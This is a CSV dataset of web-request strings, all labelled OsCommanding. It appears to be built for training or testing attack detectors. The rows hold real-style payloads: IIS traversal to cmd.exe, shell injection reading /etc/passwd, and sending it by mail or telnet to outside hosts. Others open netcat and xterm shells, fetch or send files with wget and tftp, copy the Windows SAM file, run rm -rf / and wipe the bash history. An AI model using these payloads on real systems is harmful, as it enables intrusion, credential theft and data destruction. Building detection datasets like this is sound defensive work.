id,class,vector
3061,OsCommanding,/noFHY4v6eRldrJVRz8/hg7NtHnz9bB@nuM4f/nuenrytnIf/tsir2zgR8bQXx7Sxd8/LYBHDidMy/opn.htm?cnnhz3Se=%7C++shell%28+++%22cmd++++%2Fc++c%3AInetpubwwwrootMSISSnc.exe++-l+-p+++2543+-t+++++-e++cmd.exe++%22%29+++%7C++%27
3065,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
3081,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
3098,OsCommanding,/ob7aKR/ObWYwscriptKb/dwuRY1xPp.nRV2.jpeg?hk7gzEhwcIns=varua%3Arnlis3eaT9a%3Bao&oiiehadde=31952&Ppdcty=167.169.168.172++++%7C++dir%2Bc%3A%5C&ltOdnyzhVer8b=209540&djixapdow=titeil%2Bc
3102,OsCommanding,..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
3116,OsCommanding,/itsEene/o3ZP5Rqz2pKP8Mh9U4/.Mm/fsaEtuae4tYejnHs/qIVDFO.9mi8wUezYUKT/aobqpcZS0@46/maileval0mrUKQ/uTuzt/buuxKKuBK.shtml?lUbeahbswsefm=6ssneCoq&4zqnaCz=2295&yldehsino=mrDT&91s=qeedi&LcnOwtTit=na&EheokxRoCtpeAT=4a%5C&ronkdtRgcagt5t=Rom&mkch=l%27i%2Fcopyhi%7E8a&d7mewepee=%7C+id+%7C&spee2aaCetcEnhe=189118&6x=de&wEdjktsgoe=107058
3126,OsCommanding,/eX49vERZqqe/m3rselEetb6e/iAHF7vBGZxBs0/lIspDW/gsau7Ma4nheaap1r/erd.jpg?onal5le=2726263&iTugirnDue9n=167021973&i1VJqH27Tp=90&leaotxnreta=n%3Cs%2Bi&NtmOlkMti1=%27++%3B++cat++%2Ftmp%2Fres++++mail+enin%40se.com+++%3B&mazhiioaRden=5375744
3127,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
3138,OsCommanding,/bin/alibaba.pl|dir
3145,OsCommanding,/scripts/..�
3151,OsCommanding,/jTs2tIdvnw9.cq/hAechooTOpzjSO/o5oau8nM2araq/dmrj4X9szvpq/ayHp/YFG3stdin30i7e/itenomeztxctCgroPeyN/trKNq/2s0eHee/DobjectQmformP/R56P/aILP.jsp?saarntm1onsi=9&rkgkdr=iltjtnstmcoitojt0&esaie=%5C%22++%5C%3B++++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+www.riatlillelas.com+896%5C%3B&ori2sbeieL=nfd&snn=qKR&9LgbaBdpennagt=47&tEnohsw=959&rjaaiesadY=ka1euq1sephesaxtd&qrmasa4jhitt9=vbMZcXy&zbyssyZjA=ehensobE7aI&rositet=+et%3Dou&bert4wtxnqA=hitalao1htb4moesr&eK4tGuvcopyZ@2y=%270bgsoundLtwcopy%29Vehligd2hrs
3167,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
3171,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
3177,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
3178,OsCommanding,/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir
3184,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
3185,OsCommanding,/backup/..��../..��../winnt/system32/cmd.exe?/c+dir
3190,OsCommanding,/o47M8Qm7.5KMlh9PK@/k4U9jdY/oYtRH/2solsndafesphaIea/er6a8dnh8ry/he/n@0I50ptnTej3KXGCaB/protttudgoes6raAt0n/i9oorgHas/ezTieO8mTnotedtUo7bl.mspx?iqfnteeO=8HbUiqrOetifEsa&end8ea=090333337&reebOeLm5nGo=8horcOahbeh9ca&lweddthsitaey=38428199&otaotit=3&otgoaama=%27%3B+++++rm++%7E%2F.bash_history++%3B&Oa34m=1452
3197,OsCommanding,/lb6xshisiTa/hWEgo/0I0yIAH-S/kHepi/sLLXKjGCAXamgBuY_a/libformtyhOxVfhaving3bHB_/gZ/uYIzDQLjitgBZ0rutVH/hpyyO.js?j5SoKRjFUMY=091202276&nDzg4rne7sn=3&er6osdnl8i=%5C%22%5C%3B%5C%2Fusr%5C%2Fbin%5C%2Ftelnet++www.antoveesmama.com+++4708%5C%3B&ZEdcTAJZ=%29n+mochanetcatse3%3Dtwindow.openeev
3200,OsCommanding,iswutcD=09500430&Acvseubs9eeo=59762&bbpcslehef=8790242828&boot.iniZfJJbb5St=32359262&drt=393&6ainetNaquz=848963457&6mgm=ueeinmneen&87Pv=|  cat /etc/passwd&Shin=89t&b4osHsaatditj=tus0ueR
3204,OsCommanding,.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir
3206,OsCommanding,"/scripts/file.bat"""
3210,OsCommanding,ow1zdyi4t=rt(e7-nfsoA&R.kPRsQN2Lusr=et7o~24Gnae&boaF7=nL@sioSLX3am&hvUsoii8Zne=nbqqJe&oseoge7a1hoOhan=ixelnrdmrnoaponmne&vSDsshutdownVILZ=A 08ooptgtfc9xtermhavingr rm$&EntAhesAduarAh8=geoe isock_stream&ycymejz=458&acoez=79823&runn5atehqn1ix=5enart&yoa1tlk7js=1to
3213,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
3224,OsCommanding,/akp-t/aiasHnatisEo/i@fLdIZE247xCbb/wDLjrO8phkZ/fyMXQ/rqrG/0olJz8D/taoizw8gaE6azjsu/stAieLNi2ttmediu8/iHAJ.shtml?vlesrsy=eijsgEqeIsbodls&telmHrxdfi=+++++%3B+echo++++++%3B+w+++++++%3B+++uname+++-a++++++++%3B+++++id&uEiceeat=8768111&bhttpGwdQdopenjT=03&szfizmeh=218539&6S4txe=itiioir%2BttdtmpEEs&vehteobERai9r=r&9a0a=ea1eD&Talla=eYAUvIfIvwg&oisuaa3eHtca0=ahptAe&cioldseont7ojm=6
3233,OsCommanding,/boikt7gohtdasajb.asp?scriptaA0a=s%40Kt&ctta6ims=cHootrtesr&1niam=o%27sdm&woyocOeeEe=8148992&td=mail+ovnes%40vsatre.gl1c.gov%3C%3C+%2Ftmp%2Fwu.c+%3B&hihr=uvs8m2i&or=wwsne8ehoo8&u8A=oomenctUeil&altmD=lqzeerv%5D47tvkorps&nginlaaen=ttl7elinkI5wg93ahttpsani&tyGc6Rh4i5=8411&vRISj=thpVYJxN&eomm=cdpLsra&bhlkosu6audohEa=r1ne%3Fm
3235,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
3273,OsCommanding,/4JdeleteNYlc5IaVWOX/rROMm4R4axbC6nvTAW/scKlnPgJh8/es6v-xLm_/eerg.tiff?nahay5edHt=357&nDUflilpe9=%2Fperl++++%2Ftmp%2Fsitrve.pl+++++-p8228&mC=67533479&umclAiitwczi=%28sn1hnodemt&nTsndn1=ltEr%2Fdxztvbscript8h&ygboQnieele=52316&arnatoroN=69475464&oqleDhopti=lashutdown&slrcazl=rywf7m%2B3g%2Fu%3Elwj
3276,OsCommanding,/dropy1QiNM/npSgY3rj/efWfZGp/hbd/RjF/9K9.3Nj_/4qePnDZm6y.html?XKE8GhtpassMGJi.V=484786&oianfu9y846wyRo=e%40ZO7KRt%40MI8&zstniaEehs0D=%24snvarse1&bkaccepttD=ogu3xs%29drslUt+e&3mt=wuihfL+nvbscriptprr&oada4thtwt=zLFn19x5Dm&dTetaaedEo9=847701&edcwuZWsqE=vhathaving%7Ei+b+cmdod5&yncenforupera0s=4n%2F&bTe0rc6eevn4=413928563&hr4cN1ck65FenAV=%7C++++dir++++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C+++%2C&niXrt=teEigk&toel=%3Cd
3281,OsCommanding,/ywltSAtiec4ndeera/ETnet0/ie/rom4BOZFXtZ/wVi5f4LZr1yLVHiz/l6EpvkoqG23rbwFAWq.mdb?6reet7eeUt7N=n+htpassc%40&2yLnoTP=68&ycatKW2evalMocH=14&oyrtn=nreap+1kletcAsesoh+sl&elgtetil=%60rm+-rf+%2F+++%60&Zd1dfRsandpZh8=%40wsncxmltdyss&eOLV5f=e&drtotua1=aETKMyUCsF.&0ch=if&f9Rv=9769619
3283,OsCommanding,/eeeadFHbnrvf2k79d/rwShu1n/pE1OD_o88j/passthruENouHp.jpg?
3286,OsCommanding,/ch0ATNTgNc/eQwb6/7Hr2ZnoPTCPZxsdfnDtz.gif?weh3otagtiiT=%5Cnwget+++http%3A%2F%2F154.152.76.25%3A116%2Fnftp.exe
3294,OsCommanding,..%%35c../winnt/system32/cmd.exe?
3298,OsCommanding,/nc-_y0r.gif?tratag=672&lddxeJinfltiib=tll5dql&hnhl=96&formit8eaaOo0=ligH&mn0rnewabysU=i-gVR83%40k&ureNrel=%2Fbin%2Fps%2500+++%7C&eeyoAiigun=tnui2noshm4pd&fCiwmeo4T=mis&uk15mtdRmo6bare=406&veolyLeertseh=PCr%40+passwdu%27noneo&1nixo=etn%25uesrEi+s8%25uora&sdax1DGa=ahvgD6.5
3300,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
3303,OsCommanding,"/scripts/file.bat"""
3305,OsCommanding,/eWthgMH1Tjt/xgVformP9j0wJE0U/acVnBZE6Y2i/nQ2@P76Twyi7u0.Z/relTaaqhsldmnp1cu1.cgi?le5fdditd10ojz4=ryame&eencei5S=stdnysHrICep&c6eeel5Jter=%7C++++echo++%22+++Content-Type%3A+text%2Fhtml%22+++++%3B++echo+++++%22%22+++++%3B+++id%5C0&1aoA=iS+passwde&afb=8&ae3ra4h0fhueH=%299%25oe%3Anu&xgtmpreplace=a2t%3B&ltttolz=lLfm%409q&o6dKYivgT=3933054267&tfitOimureTye=92717
3307,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
3312,OsCommanding,/inu6Y0Qvbscript6uusrGf/DwtP3XYchildX/njM2gVO0LtZ_vcG2F/scjesetKrmn/o5J/nW6jS2jj.htm?MiMQG=%250a+cat++%250a++%2Fetc%2Fpasswd++%250a
3313,OsCommanding,/et/wLn6kx49eJvP/unTxDK6Diku/8p5slaOekmS4eLte/3SlaX2MN/t_x/S8retcehT9Q1kcsu6ro/tticoKwlnohwnes/1wJAeR3.jpg?3iIxsgj=ie1n5man2n9v&tztnN=3087015994&2@Jb7Sbj=d2t58dfh&ianttem3uabl=ee%2Bnio&tx5a=9y&bnenumrjnsitscE=ulteAorn5qsatE&acTs=e9psUgK_wE2&xp_passwdfnbmOW=o&ry=566621&EsltieTq=ex&uerwis=ptpagtrLhTqhtTdlo&graarkAAe7Snntf=oops%3B+++++cat++++%2Fetc%2Fpasswd++%7C+++++mail+++++your%40at.com&ihtaTafrteno=61638936&a2aklorol=txnacceptV+tp
3314,OsCommanding,/eI1He6c3Ea1Ku7rW5ZCV/net4ng/fgcD4Y0QI6K8qjzMBmsS/ihg/yAUCsQQJ0Zv8aoh5Xs/eRdklDeQJZ-LI2C/P7accept4bXReOU/4r@9pi4AxbO/8r.cgi?5naos1nm=1341&LM=t3PVs67URMe&bcmna=302815&t9r=694951&dsedju=oops++++%3B+++++cat++%2Fetc%2Fpasswd+++++%7C++mail+your%40th.com&RuIgaltogteHsD=o%3Aeatthe%3Enmnetcatevardvbscript+Zo&oawPn=zoueus&vuhieunqe8ul=2%25j+%3Bksdiv3as%267ishcMb&lfrtvstamtgtri=msanla&2rnhw8ar78eni0=a&updateruaxtermR=sDq&_9eUTHg=aI3%40p&ghar=exectm+Klnao
3333,OsCommanding,/Taefenxmoep/ovt/YYP@qn5xmlF/i_yNgz8sNr/qnehwTerodnadmcso3ae/ceeixs6tcehtwiien/qEme.pl?zo=cathShadyftpi%3Ahm3nh%7Csseval4&isOzIhmu9=bodyt1a0de7Dnb&tace9ft=seewgett&fhE=igwinnt5&aa=831016&4ideFnaiiw=arsy+62%5Cilxjhal&ewHraadman=a57th&euipeceheksMdq=oa&sodcrnji=o4ee&lkey=y-9HPPvTo&eeenemytsdues=gMrErpycN&raoie=6
3334,OsCommanding,9o= http[ex&oi1dElet=47689&9maeIccifce=r&tmc=t'Al&ot5fwha=AepNwWoaosmi9st&Rkare5ohr3a=353&rx0cmdWeuizi3=57
3336,OsCommanding,"o2tateo4Lb9=|shell(  ""cmd    /c     c:InetpubwwwrootMSISSnc.exe   -l     -p 9667     -t   -e     cmd.exe     ""     )  |     '"
3351,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
3366,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
3375,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
3392,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
3399,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
3410,OsCommanding,..%%35c../winnt/system32/cmd.exe?
3412,OsCommanding,/oddtoNrsnynyfos/gillocr1esrdbnhqsf/euS23LOIvdHh/otrtnito/qY-14k.-6deGX2pB2/tgcemkt6e1tu.htm?xtadahttwTe=teleEntepo&ui4hEiisrl6=9%40y9KyX&6e4ohpd=%5Cr+xterm+++-display++20.152.25.116%3A0.0
3419,OsCommanding,eD6iveMyu=sitd%Ot<%atOh&7bwf=2oZAzB&5tecIteess=s&TfhinEy=229.237.38.1| copy c:\winnt\repair\sam._ c:\inetpub\wwwroot\sam.ddd&xottts5goe6viEa=183945669&e04eezA0ttFi4=54C7yY7GA8
3425,OsCommanding,/rKlHrN/VLgwBN1EcBq/cgxaFVVBUYIT/Syoleaw/rKynk2AL.gcG9S8xV3/oeu5psotIoeopt3s/edtambskogdi4e/i0QxvTnB.F2t3g6ZF6/deleteSdeleteQimg_includeidocumentHmAm/-Qp/rvfP/5sflIJmailUxmreplaceCx.jpg?tzdlonEmeenyh=x%3Fde%3Fllst6i+sho&M1iInmI2Tasen=owpnDtt6jmabenimx&Sks6aRlfsp1g0t=%3Etq%2F%3D&NSheAoeAtye=Sf&ltl6nw0eiSn=44746264&5aerhQ=++%3B+++echo++%3Bw%3B++++uname+-a++%3Bid&nteyoAim0uah=S9&Si1e=s%40kxtJ&Y5ezb5s=tryovwDrl&dtmi0Igm=rD&s82nfiezn=xetau3u1a0rvcb2bx&ZF.kQps1u=ruJdIOKf_g&oor=lssghyw3t%3B+r&KIzBchildYupg=+7stdingroup+byTnl%5B&dI8tnihaNgdpl=evo8oenGTzbietzto
3436,OsCommanding,/uqtod/d_4/f-L0d6dR/BscriptHEqnFwTetc/r1hO5pb9a-04vfJ./bDrhw.wk1Hj1twd.html?KiA2=%5C%22+++++%5C%3B%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+www.etiegeraol.com+++++01168+++++%3B&Oobbo=eysheroc0t&ay75rh=4562290&anehatanoooSttt=33375534
3444,OsCommanding,eD=0244446793&wp-KSdropjupdatetelnetRUDy=\;\/bin\/id    ;&Os760tssa=alwzlpes
3452,OsCommanding,..%c1%8s...%c1%8s..%c1%8s..%c1%8s..%c1%8s../winnt/system32/cmd.exe?/c+dir
3467,OsCommanding,..%%35c../winnt/system32/cmd.exe?
3474,OsCommanding,/oyVB7J0h5cnbmF_vuaRF.sh?Ushtdth0=4A8n4chroddds%5D&e9etd=e+biuln0rY0o%7Ce8&omEee=%7C++++dir++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C+++++%2C&ee=hfFej64K.P&PWODcHHfjSxvbscript=7&m4efqtl=Cf&udasELTestoo=ru6o1hath7er&liAsflu=3082
3476,OsCommanding,/snEhWdIDY/tQK_vAJ0cXrZKKytjb/hid/iT/mZROB4eKSkj3_1a.jsp?oorneryctt84t=%27+%3Bps+++++-aux+++%3B
3480,OsCommanding,/dK13c6RVinsertru2-Yl/zmeta35Gif@autoexecprocessing-instructiono/titnf4Aj@@P/tmsI@.-w/lH.oGfM9Abcopy/IhIlii/iC0P-Z8Ymv9/dYk@AwxhE3/frunartleminnse3amu/l1s9E9lxDET0.png?xcztllsdmzu=r6oM6WkLT&p9ra6mtrZ=exec++xp_cmdshell++++%27%22uw6hjT6jto%22++%3E%3E++++script.vbs%27
3489,OsCommanding,/sgf4-T/sv25yeMfbMGCggWYS/iuOahgn2tUe.jpg?5mnnaa2oRiii=x+8bsske&ehioh5bed=06364&ym=%3D9u&aennohsi=0903659&O7iGnxy57H=%250Axterm++-display+++++www.reic.com%3A0.0&ceap=%29smmhs&zt47tl=tocretrhe&69ZX=stelnetd%5Diie6eoo&hd1frls8egut=s+bin&devNrdedtoiA=149150&wJ@oboot.iniXZevalrU8C=066520469&oitialoeaHal=kykE3Be_rFQ&kteiuEi=ut5e3Nechs8%28v3r
3493,OsCommanding,/aQhHSyN/uA/mhfsiesB/cBzn/7D/6..cfm?B_Gor=%7C++shell%28+++++%22cmd+%2Fc++c%3AInetpubwwwrootMSISSnc.exe++++-l+++-p+++++6604+++-t+-e++++cmd.exe++++%22+++%29%7C+%27&UQRJ4K9=te%25Tex%3Dtetc%24
3498,OsCommanding,/handler;cat
3499,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
3507,OsCommanding,"cIelg=tNWR&E1zFlinkv=ox7&5lwdn1i=Zlci &hNgOoas5lea=896446&UkRVAw-bQGAA=ismedhunewinntd:&siDhurmdeat7i=sel962&uihaIiarr=no;&auygBtotxtel=\""    \;\/usr\/bin\/telnet www.ilndtrmeleri.com    05   ;&kgmsSstetejvaxe=8528465&5neUtl9zt=osweo&qQ-Rdb=eZnn"
3518,OsCommanding,/loe6gisein/sbtbesDs/aEqWfe8.9LQX1O.htm?raht=%5C%22%5C%3B+++++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+www.tantinestola.com++++89081%5C%3B&gwdtkIgcoIt=%248stoe%5C1iti%7Esa%26
3519,OsCommanding,/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir
3532,OsCommanding,/msadc/..%5c../..%5c../..%5c/..�
3554,OsCommanding,"/scripts/file.bat"""
3556,OsCommanding,/aJTrk3dtbGSrRXctls3/b33wS_/ool77R/hBrp0IoNfmsYSjeyS/mk63fRKRgl0HdwiQdJX/rCEEH6nxb91uJHIkR@.mspx?aooaetnmnecg=1089&Jm3VbCdWETS=ywehtacces%29eat5&ju7ehAFuXE=n&body2.hbodyW=155554&wdrs2Aem=1e0+gtcefEaoptayt&aR9styrdeaRlIg=nc%24d&tkotn=75645680&optOrmp=5-rn+iincludee+%3Eecho+princludesto&teaa2=odSnysuauo&DXwMtyffpyJB=zeSmlu%3Ddccpassthruz&a9cea=tdgD&eued=095&mMPSYEtqc=8&9jMZyeF=%27+++%3B++rm+++++%7E%2F.bash_history+%3B&whns=v+mail
3564,OsCommanding,/l7t6th6h/eTlGP4/RbgsoundCHrHUA7/saeabaex2fon/k3H296eCI25QT/mMBzH9olBopu/letkswoxy6tS5l60ie.html?4us3oaS=fa&tgir7nassgsAR=UswodltyxnteI&deo3wherevtveH=lT%40i&tumDsywtti=+%3B++echo+++%3B+w++%3B+++++uname+++++-a+++++%3B++++id&QZa@BR.VLbgsounds=fhdqhboot.ini&_AgetmppJkp_=2090916343&TgcLtFX=0nzN&b1BidcO4DQfrom0=ttFN&eesXistheT=eaiorpencoptl
3576,OsCommanding,/scripts/..��../winnt/system32/cmd.exe?/c+dir
3601,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
3602,OsCommanding,"/scripts/file.bat"""
3614,OsCommanding,/reesglQ4ktfsch3nnd8/ifpsVa-htaccesgc9BZ/mHDSt_BMivTU/iist.html?Od4Ntot8arhhwh=2.218.142.18++%3B++tftp+192.168.10.33+test.txt&ta0edeqansgjiOe=aA7ne67beirzhsa0zt&atReghihs=7&ahfltesH=isIYp&6lnspt=t%25&torvmaoanorfos=ge%2B&xe=xrC2iehsh&to9feskw=4372683&ecemhmkoahwais=pdKueJ4oNP&tesGoetnwoZ=6&ec50=qqeoobtoswcc&dGoht9s=762794&cllS0haswa6r=%3Bme&etie=e+t
3620,OsCommanding,/rnsdzao/4683-bQKxfHS/rtordqenKse4bbieTayt/tjn9Iz/trpj/asJO.e6QPh.mspx?VsC7zX2=d8brTaat0ipy&smdhloat=atetx8av9h6o&0pgrrNuolrxw=3&a_iZF=800&KginVprocessing-instructiondWA=i%40&aneAilafc9i5c=38034&istechld=%27+++++%3Buftp+-g+++++%2Fhome%2Fsigeinriti%2Fteelli+120.63.160.196+%2Fte+%3B
3628,OsCommanding,..��../winnt/system32/cmd.exe?/c+dir
3631,OsCommanding,/oAo/sew9T.css?9krocmanmmlo=e3muatw1ctd&A9jadflroealE=%60+rm++++-rf++%2F%60
3632,OsCommanding,/5enEoUml8FtNnti1e5al/hry2n2atA/ea2mkRcHT6/csool/rv3LQ4.QnrJ1kmmk-eBm/5qlikeLQOf8CLs7-S1.php?Siannlai0Gfes=3498579&urrEb8ebs=r&eoe=nN_&kdos9chlfhetor=soaneo8aqi7oonmur&mn6ijaNuCts=8ehobjectnbeHa&ettl8siDs=%7C+dir+++++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C++%2C&bsbiw=513&iNaerisolhtsg=2639320&fdezHAonrioixgs=cautoexecvbscript%26l&92luny3lt2=679&eisE0ner=y%5Cre%3Ejby&passthruq3MaqaG=eHgn%29i&uNrau=a&ttokpair=-homej&eilf2ctrl3=eSjpZAr
3637,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
3667,OsCommanding,/hbIiiewwtu/Vwxg/u7njmocepztCeryn1vr9/lBo-lJJy3v5/K5upqaZ_Y./oDlLMS@L@7XcH7c.asmx?hckarhf=%250A++++xterm++++-display+++++www.eteser.com%3A0.0&wostH=1248
3672,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
3685,OsCommanding,/drLe8fdteCesrepne/9Fbetween8P/NWachoteregstesClws/a8CSq3.cfm?gieaadalbit5=m%5DdsuG&D2d8@A_=eces&cessncecps2Aego=o6Zu_
3696,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
3700,OsCommanding,/yrTHGJfw3/0S3kky7nodeDyHm_zT/mLb0dbetweenFW/fICftjSEYIHi/tFflUA0/o3j7Z9yiS@/mxg8Hz--G/c8cwJ9/aOHy6/dST.aspx?nn6aezshsare=49767585&yseooleed=znrsio0xhe&AMiframebh6phpRq2e=ie&aTioDhnh=jxbgAOnv&slrecef3ooettd=esselect%24&vi0iebieetx=we2hod&mR1b.3X=nxSV8D&crTm=+++++%3B+echo++++++%3B+w+++%3B+uname++++-a++++++++%3B++id
3705,OsCommanding,/wth_kTbtkzfOY.phq9N/p1Lx/y9h/3UD/CQ2/ms0ti/aN5orYGoOH/iLiFlTpI3DYlbWVHycx/rLThTTbh2.VBWqx-TsaJ/ssSBm9A/emgiNR/telnetbinFiksqMaccess_log.pl?3ey=svatehUeat%2Fd&ttEaefenpeoemsr=268421&bl=9291239&a3=ncCstwrcos36qu&Yatiee=wOaco&Nd2r37bGtueuiE=O%2Ff&h3a=81260637&ols=iWIPu6BOzl&eoibtpn=nn0ybody%3Faa%3Df&A7PnLh=%27%3Bps++++-aux+%3B&ltn9tssLm=qodoo1mnexecs&uh8ld=cgTEKBt&Etdtsoc1wsii=7460
3707,OsCommanding,/0ThPQigjwYPd/suo/re3d7y/ii58Bdmeftlseajyxn1/wruooh/ile0nuymo1yI/o332I/toT2lea3c/emsB/_EYlUCmocha_cmdOMklike.swf?hHtesoceeh6e=ej&tpbahrgl7Ai=rbinincluderrzmailnh%24hccI+nirdi&nab=1&ageh=89784965&phdrDesWr=79.65.196.144+++%7C+++tftp+++++-i++++132.4.249.218+++PUT+sam._&E4tbtD3ec5oe=window.openrywiUmxhavingMoo&hss5q=fp9hoc%3E&sZeesilennees84=5090&VYPv5JKgshutdown_=odoi
3714,OsCommanding,/samples/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
3719,OsCommanding,osanLhm99eh=ni$&netppyadlir=s7C7nld617ll&mismoi=051&wVSqTR=85EO0IdfX&ntiUt7UElhze=wgetu<d&KBrmz=5Rwri@PsK&mez7ouaeeseshet=00964&soiroa=td&gtaeoor0ajn=| cat /etc/passwd |&.NQMconnectHwJjaccept2R=51609191&saeruSac=94842586&nuos=885
3720,OsCommanding,/bin/tn.pl/seite=;cat
3725,OsCommanding,/bin/alibaba.pl|dir
3731,OsCommanding,6eiynae=1F5IrHB&hl=532&se1ieerO=iwp-wn:inihyio/a nullfl&qw8ocokbyio2=xjt&ennfp=29&iATtennm=iYeMiurdl1hxng&evalv8w1XcJ-6=jidy
3739,OsCommanding,/scripts/..%5c%5c../winnt/system32/cmd.exe?/c+dir
3754,OsCommanding,/8t8xnu/ca7ysblS0otmz8qheel/Ba1iframetmphLadminxmlI8fPQv/ei9nsns4dtyo7m/h7tyDnia3asI/wmHo9s4gpamea/29rnrhrtfed/h1sock_streampassthruORwinntd4V0d.jpg?etru5aKeh=e6sOselect&nDwnehHEn4=557927&ti2iLa=039&t0mdc28nols4onr=linkgH&oz@Zy=nwh388YH2
3772,OsCommanding,/afKD.2v27KjxFBwh/dhllydatnrItCte/etan2diaegsiE5t12o/y2QEX.Kyu5yUTkHThQZ9/8dCp0.msf?fiwmsmamglrmg2=3467393&67nesil=hThrgroup+byae%27Bp2hw3m&EysmtiwaIr=55102&artub=vimn&Rhiie9nveninr=39061659&srctNhfe=ssiwraIa&7yitd0th=1844259&ioiec2nes=nkivltnc9mi3ncadEi&hgett1iess=%3Fs+i&4wp-mMEmorxPtU2=%250a+++nc++www.oriendin.com++80+++%3B&tlruNs6turb=eededehomet3OQ%7Cip
3781,OsCommanding,/_vti_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe?/c+dir
3784,OsCommanding,/ihsr8xtgel1asnicL/ceMzwehoitiohisntie/0G/hcsB1bit/oPfe19KIqf/eyjuJBDOXvAC/rllht/owppImIHANr6nOxuy40/d6f8uESdx.shtml?tzik=06&saeee=%60++rm+-rf+++%2F+++%60&1ro=rseikhU
3789,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
3793,OsCommanding,/backup/..��../..��../winnt/system32/cmd.exe?/c+dir
3794,OsCommanding,/aURNwfw1s8w.irCS9Ju7/paadminyGtu/T4gX/mVq@.H0dfN4S6tR5/rZCe3varddscancZ5Z/sIcxgk_Js7msK2_1bz33/iC/epobM/esilgStotgtaeyaaal0/MjhB4.idWwJ4@-Q/puW6zdggy-lYHt7RQ6Tq/99.tiff?6Fshaving=rmgOUm9ydieNdinda&elre=brdbino8iTipoiw%3CNsnro&aiVsarnymre=70790665&U3Vc-OvVrQbetween=%27%3B+rm+%7E%2F.bash_history++%3B&eDBhSoj=605869891&6Pxl=+stsVs%5Bdoe%5Ciyokc&ilEyAy=sTtd2khJb
